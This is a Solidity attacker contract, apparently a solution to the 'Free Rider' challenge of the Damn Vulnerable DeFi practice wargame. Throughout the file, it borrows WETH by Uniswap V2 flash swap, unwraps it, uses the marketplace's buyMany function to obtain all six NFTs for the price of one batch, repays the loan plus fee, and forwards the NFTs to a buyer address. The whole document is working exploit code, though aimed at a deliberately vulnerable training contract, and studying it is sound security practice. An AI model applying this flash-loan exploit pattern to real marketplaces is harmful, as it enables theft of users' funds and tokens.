
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";
import "@uniswap/v2-core/contracts/interfaces/IUniswapV2Callee.sol";
import "@uniswap/v2-core/contracts/interfaces/IUniswapV2Pair.sol";
import "@uniswap/v2-core/contracts/interfaces/IUniswapV2Factory.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721.sol";
import "./FreeRiderNFTMarketplace.sol";
import "../DamnValuableNFT.sol";
import "../WETH9.sol";
import "hardhat/console.sol";


contract FreeRiderAttacker is IERC721Receiver, IUniswapV2Callee{

    FreeRiderNFTMarketplace market;
    DamnValuableNFT nft;
    WETH9 weth;
    address buyer;
    IUniswapV2Factory uniswapFactory;
    IUniswapV2Pair uniswapPair;

    constructor(address payable _market, address _nft, address payable _weth, address _buyer, address _uniswapFactory, address _uniswapPair) payable {
        market = FreeRiderNFTMarketplace(_market);
        buyer = _buyer;
        nft = DamnValuableNFT(_nft);
        weth = WETH9(_weth);
        uniswapFactory = IUniswapV2Factory(_uniswapFactory);
        uniswapPair = IUniswapV2Pair(_uniswapPair);
    }


    function attack(uint256 _amount) external {
        uniswapPair.swap(_amount, 0, address(this), "nothing");
    }

    // Uniswap V2 flash swap example: https://github.com/Uniswap/v2-periphery/blob/master/contracts/examples/ExampleFlashSwap.sol 
    function uniswapV2Call(address sender, uint amount0, uint amount1, bytes calldata data) external override {
        address token0 = IUniswapV2Pair(msg.sender).token0(); // fetch the address of token0
        address token1 = IUniswapV2Pair(msg.sender).token1(); // fetch the address of token1
        assert(msg.sender == uniswapFactory.getPair(token0, token1)); // ensure that msg.sender is a V2 pair

        // unwrap the weth
        weth.withdraw(amount0);
        // setup all 6 of NFTs
        uint256[] memory NFTs = new uint256[](6);
        for(uint256 i=0; i<6; i++){
            NFTs[i] = i;
        }

        // buy all of the NFTs using only 15ETH
        market.buyMany{value: amount0}(NFTs);
        // calculate the fees
        // according to Uniswap doc, fee is roughly 0.301% https://docs.uniswap.org/protocol/V2/guides/smart-contract-integration/using-flash-swaps
        uint256 returnIncludingFee = (amount0 * 100301) / 100000;

        // wrap the ETH back to WETH
        weth.deposit{value: returnIncludingFee}();

        // return the flash swap loan
        weth.transfer(msg.sender, returnIncludingFee);

        // send nfts to buyer
        for(uint256 i = 0; i< 6; i++){
            nft.safeTransferFrom(address(this), buyer, NFTs[i]);
        }  

    }

    function onERC721Received(
        address,
        address,
        uint256,
        bytes memory
    ) 
        override
        external
        returns (bytes4) 
    {
        return IERC721Receiver.onERC721Received.selector;
    }

    receive() external payable{}
}
